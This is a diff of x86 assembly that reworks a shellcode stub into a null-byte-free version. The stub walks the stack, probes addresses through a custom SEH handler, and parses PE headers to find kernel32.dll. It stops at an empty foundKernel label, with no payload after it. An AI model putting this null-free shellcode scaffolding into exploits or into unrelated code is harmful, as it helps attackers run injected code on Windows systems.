@@ -1,105 +1,48 @@
 ; Author: Tarek Ahmed
 ; All rights reserved
 ; Email: unix.geek2014@gmail.com
+; NullFree
 
-
-sub esp, 08h
+sub esp, 8
 xor eax, eax
 cdq
 xchg edx, ecx
 
 
 StackWalk :
-	mov ebx, [esp + ecx]	; We walk down our Stack and all the previous stacks as well starting from 0
+	mov ebx, [esp + ecx]	
 	mov edx, ebx
-	shr ebx, 28		; Get the first byte in address E.g 0x71234343 --> 0x00000007
+	shr ebx, 28		
 	add ecx, 4
-	cmp ebx, 07h		
+	cmp ebx, 7		
 	jne StackWalk
-
-
-
-
-checking:
-
-	mov [ebp-0ch], ecx
-	push edx
-	call checkAddress	; Check if the address is valid first using SEH custom function
-	cmp eax, 0		; If the result of the function is zero, then it's valid
-	je valid
-	mov ecx, [ebp-0ch]
-	jmp short StackWalk
-
-
-valid :
-	mov ecx, [ebp-0ch]
-	mov ax, 1001h
-	add eax, 0efffh
-
-	sub edx, eax		; Subtracting 0x10000 from the address to get the base
-
-
-	mov dx, ax
-
-
-	xchg edx, ebx
-	mov ax, [ebx]
-	cmp ax, 5a4dh		; Check if the address starts with two bytes "MZ"
-	jne StackWalk
-	mov edi, [ebx + 3ch]	; Walking the PE file
-	add edi, ebx
-	mov edi, [edi + 78h]
-	add edi, ebx
-	mov edi, [edi + 0ch]
-	add edi, ebx
-	add edi, 04h
-
-	xor eax, eax
-	push eax
-	push 6c6c642eh;.dll	; Check only the string el32.dll, short for kernel32.dll. Unless there is another dll file with this name.
-	push 32334c45h; EL32
-	mov esi, esp
-
-checkKernel :
-	mov edx, ecx
-	mov ecx, 8
-	cld
-
-	repe cmpsb		; Compare nel32.dll to the PE string.
-	cmp ecx, 0
-	je foundKernel
-	mov ecx, edx
-	jmp StackWalk		; If not, then it's not kernel32, jmp back to StackWalk and repeat.
-
-; jmp brute
-
-
-; Exception Handler function
+	jmp short checking
 
 checkAddress :
 	push ebp
 	mov ebp, esp
-	jmp rev1	
+	jmp rev1					
 	reverse:		
 	pop eax
 	jmp eax
 	rev1:
-	call reverse		; This line is getting the address of next instruction, but I do it this way to avoid null bytes because it jumps backward.
-	add eax, 1eh
+	call reverse		
+	add eax, 0x1e				
 	push eax
 	xor edi, edi
-	push dword ptr FS : [edi]
-	mov dword ptr fs : [edi] , esp
+	push dword ptr FS : [edi]			
+	mov dword ptr fs : [edi] , esp		
 	mov eax, dword ptr ss : [ebp + 8]
-	mov eax, dword ptr ds : [eax] ; is EAX valid ?
+        xchg eax, esi				
+	mov eax, dword ptr ds : [esi] 
 
-	xor eax, eax; Return 0 if no exception.
+	xor eax, eax
 
 	jmp short cleanseh
 
-	; Exception handler entry point
+	
 	xor eax, eax
-	inc eax		; return 1 because of the exception
+	inc eax		
 	mov esp, dword ptr fs : [edi]
 	mov esp, dword ptr ss : [esp]
 
@@ -108,7 +51,58 @@ cleanseh :
 	pop dword ptr fs : [edi]
 	add esp, 4
 	pop ebp
-	retn 4
+	ret
+
+
+checking:
+
+	mov [ebp-0xc], ecx
+	push edx				
+	call checkAddress		
+	test eax, eax			
+	je valid
+	mov ecx, [ebp-0xc]
+	jmp short StackWalk
+
+
+valid :
+	mov ecx, [ebp-0xc]
+	mov ax, 0xffff			
+	inc eax
+
+
+	findMZ:
+	sub edx, eax			
+	mov dx, ax
+	mov ax, [edx]
+	cmp ax, 0x5a4d			
+	jne findMZ			
+	xchg edx, ebx
+	mov edi, [ebx + 0x3c]		
+	add edi, ebx
+	mov edi, [edi + 0x78]
+	add edi, ebx
+	mov edi, [edi + 0xc]
+	add edi, ebx
+	add edi, 4
+
+	xor eax, eax
+	push eax
+	push 0x6c6c642e			
+	push 0x32334c45			
+	mov esi, esp
+
+checkKernel :
+	mov edx, ecx
+	mov cl, 8			
+	cld
+
+	repe cmpsb		
+	test ecx, ecx
+	je foundKernel			
+	mov ecx, edx
+	jmp StackWalk		
 
 foundKernel :
-	
+					
+
